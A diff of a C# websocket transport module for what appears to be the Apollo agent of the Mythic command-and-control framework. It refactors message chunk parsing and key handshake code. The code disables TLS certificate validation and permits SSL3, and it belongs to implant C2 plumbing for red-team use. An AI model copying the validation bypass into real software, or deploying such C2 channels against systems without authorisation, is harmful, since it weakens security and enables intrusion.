@@ -18,6 +18,7 @@ using System.Threading;
 using ApolloInterop.Serializers;
 using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Events;
+using WebsocketTransport.Models;
 
 namespace WebsocketTransport
 {
@@ -113,7 +114,6 @@ namespace WebsocketTransport
             ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
 
-
             //Agent.SetSleep(CallbackInterval, CallbackJitter);
             sendAction = () =>
             {
@@ -122,6 +122,7 @@ namespace WebsocketTransport
                     senderEvent.WaitOne();
                     if (senderQueue.TryDequeue(out byte[] result))
                     {
+                        Console.WriteLine("Sending: " + BitConverter.ToString(result));
                         Client.Send(result);
                     }
                 }
@@ -179,7 +180,7 @@ namespace WebsocketTransport
 
         public bool Send<T>(T message)
         {
-            throw new Exception("HttpProfile does not support Send only.");
+            throw new Exception("WebsocketProfile does not support Send only.");
         }
 
         public bool Recv<TResult>(OnResponse<TResult> onResponse, string data)
@@ -241,12 +242,11 @@ namespace WebsocketTransport
 
             if (EncryptedExchangeCheck && !_uuidNegotiated)
             {
-                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                 EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                 {
                     Action = "staging_rsa",
-                    PublicKey = rsa.ExportPublicKey(),
-                    SessionID = rsa.SessionId
+                    PublicKey = this.rsa.ExportPublicKey(),
+                    SessionID = this.rsa.SessionId
                 };
                 AddToSenderQueue(handshake1);
                 if (!Recv(MessageType.EKEHandshakeResponse, delegate (IMythicMessage resp)
@@ -261,6 +261,7 @@ namespace WebsocketTransport
                     return false;
                 }
             }
+
             AddToSenderQueue(checkinMsg);
             if (agentProcessorTask == null || agentProcessorTask.IsCompleted)
             {
@@ -304,72 +305,26 @@ namespace WebsocketTransport
             Console.WriteLine("OnAsyncMessageReceived");
             Console.WriteLine(args.Data);
 
-            string sData = args.Data;
-
-            int sDataLen = sData.Length;
-            int bytesProcessed = 0;
-            while (bytesProcessed < sDataLen)
+            WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
+            IPCChunkedData chunkedData;
+            try
             {
-                int lBracket = sData.IndexOf('{');
-                int rBracket = sData.IndexOf('}');
-                // No left bracket
-                if (lBracket == -1)
+                chunkedData = jsonSerializer.Deserialize<IPCChunkedData>(wsm.data);
+            }
+            catch
+            {
+                chunkedData = new IPCChunkedData();
+                chunkedData.ID = "";
+            }
+            lock (MessageStore)
+            {
+                if (!MessageStore.ContainsKey(chunkedData.ID))
                 {
-                    // No left or right bracket
-                    if (rBracket == -1)
-                    {
-                        // Middle of the packet, just append
-                        partialData += sData;
-                        bytesProcessed += sData.Length;
-                    }
-                    else
-                    {
-                        // This is an ending packet, so we need to process
-                        // then shift to the next
-                        string d = new string(sData.Take(rBracket + 1).ToArray());
-                        partialData += d;
-                        bytesProcessed += d.Length;
-                        UnwrapMessage();
-                        sData = new string(sData.Skip(rBracket).ToArray());
-                    }
-                }
-                // left bracket exists, we're starting a packet
-                else
-                {
-                    // left bracket is ahead of starting index
-                    // Thus we're in the middle of a packet receipt
-                    if (lBracket > 0)
-                    {
-                        string d = new string(sData.Take(lBracket).ToArray());
-                        partialData += d;
-                        UnwrapMessage();
-                        bytesProcessed += d.Length;
-                        sData = new string(sData.Skip(d.Length).ToArray());
-                        // true start of a new packet
-                    }
-                    else
-                    {
-                        // No ending delimiter, will need to wait for more
-                        if (rBracket == -1)
-                        {
-                            partialData += sData;
-                            bytesProcessed += sData.Length;
-                        }
-                        // Ending delimiter - time to unwrap singleton
-                        else
-                        {
-                            string d = new string(sData.Take(rBracket + 1).ToArray());
-                            partialData += d;
-                            bytesProcessed += d.Length;
-                            if (d.Length < sData.Length)
-                            {
-                                sData = new string(sData.Skip(d.Length).ToArray());
-                            }
-                            UnwrapMessage();
-                        }
-                    }
+                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
+                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                 }
             }
+            MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
         public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
@@ -386,20 +341,6 @@ namespace WebsocketTransport
             // Console.WriteLine("We got a message: {0}", mt.ToString());
             recieverQueue.Enqueue(msg);
             receiverEvent.Set();
-        }
-        private void UnwrapMessage()
-        {
-            IPCChunkedData chunkedData = jsonSerializer.Deserialize<IPCChunkedData>(partialData);
-            partialData = "";
-            lock (MessageStore)
-            {
-                if (!MessageStore.ContainsKey(chunkedData.ID))
-                {
-                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
-                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
-                }
-            }
-            MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
         private void OnAsyncConnect(object sender, EventArgs args)
